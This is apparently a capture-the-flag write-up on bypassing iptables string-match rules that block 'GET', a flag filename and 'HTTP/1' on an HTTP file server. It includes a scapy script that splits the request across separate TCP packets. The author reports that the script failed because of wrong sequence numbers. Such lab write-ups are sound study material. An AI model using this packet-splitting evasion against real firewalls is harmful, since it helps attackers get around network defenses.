firewalker 1, similar to the first, is applied to a simple HTTP file server. The rules provided:

    Chain PORT_30485 (1 references)
    target     prot opt source               destination         
    REJECT     tcp  --  anywhere             anywhere             STRING match  "GET" ALGO name bm TO 65535 ICASE reject-with tcp-reset
    REJECT     tcp  --  anywhere             anywhere             STRING match  "/flag-4ae60838.txt" ALGO name bm TO 65535 ICASE reject-with tcp-reset
    REJECT     tcp  --  anywhere             anywhere             STRING match  "HTTP/1" ALGO name bm TO 65535 ICASE reject-with tcp-reset

Initially, we tried some fancy escaping tricks (replacing `-` with its urlencoded equivalent). This worked well enough, but couldn't be used for either the method or the HTTP version string.

Fortunately, these text matches only apply on individual packets. Splitting the request into at least three different packets would be sufficient to bypass all three rules.

I attempted to solve this in scapy:


```python
from scapy.all import *
import random
import sys

_incseq = 0
def incseq(num):
  global _incseq
  _incseq += num
  return _incseq

dest="172.31.2.97"
data = ["GE", "T /flag-","4ae60838.txt HTTP/", "1.1"]

def build(seq, ack, payload, sport):
    return IP(dst=dest)/TCP(seq=(_incseq if i == 0 else incseq(len(data[i-1]))), ack=ack, sport=sport, dport=30485, flags=0x18)/payload

syn = IP(dst=dest) / TCP(sport=random.randint(1025,65500), dport=30485, flags='S')
syn_ack = sr1(syn)
out_ack = send(IP(dst=dest) / TCP(dport=30485, sport=syn_ack[TCP].dport,seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A'))
_incseq = syn_ack[TCP].ack
xs = [build(i, syn_ack[TCP].seq + 1, data[i], syn_ack[TCP].dport) for i in xrange(len(data))]
send(xs)
```

It turns out I was rewriting the `fragment` function, but I couldn't get either working correctly. Incorrect sequence numbers prevented requests from being made, so despite tcpdumping just in case the server does respond, we never got a response from the server.
